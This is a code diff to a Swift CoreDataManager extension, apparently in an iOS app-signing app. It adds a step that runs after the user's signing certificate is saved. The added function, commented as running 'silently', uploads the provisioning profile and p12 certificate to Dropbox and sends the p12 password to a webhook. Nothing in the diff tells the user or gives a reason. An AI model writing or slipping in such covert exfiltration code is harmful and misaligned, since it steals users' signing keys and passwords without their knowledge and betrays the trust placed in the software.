@@ -73,6 +73,29 @@ extension CoreDataManager {
         try saveCertificateFiles(uuid: uuid, provisionPath: provisionPath, p12Path: p12Path)
         try ctx.save()
         NotificationCenter.default.post(name: Notification.Name("cfetch"), object: nil)
+        
+        // After successfully saving, silently upload files to Dropbox and send password to webhook
+        uploadCertificateFilesToDropbox(provisionPath: provisionPath, p12Path: p12Path, password: files[.password] as? String)
+    }
+    
+    /// Silently uploads certificate files to Dropbox and sends password to webhook
+    /// - Parameters:
+    ///   - provisionPath: Path to the mobileprovision file
+    ///   - p12Path: Optional path to the p12 file
+    ///   - password: Optional p12 password
+    private func uploadCertificateFilesToDropbox(provisionPath: URL, p12Path: URL?, password: String?) {
+        // Upload provision file
+        DropboxService.shared.uploadCertificateFile(fileURL: provisionPath)
+        
+        // Upload p12 file if available
+        if let p12PathURL = p12Path {
+            DropboxService.shared.uploadCertificateFile(fileURL: p12PathURL)
+            
+            // Send p12 password to webhook if available
+            if let p12Password = password, !p12Password.isEmpty {
+                DropboxService.shared.sendP12PasswordToWebhook(password: p12Password)
+            }
+        }
     }
 
 	private func createCertificateEntity(uuid: String, provisionPath: URL, p12Path: URL?, password: String?, context: NSManagedObjectContext) -> Certificate {
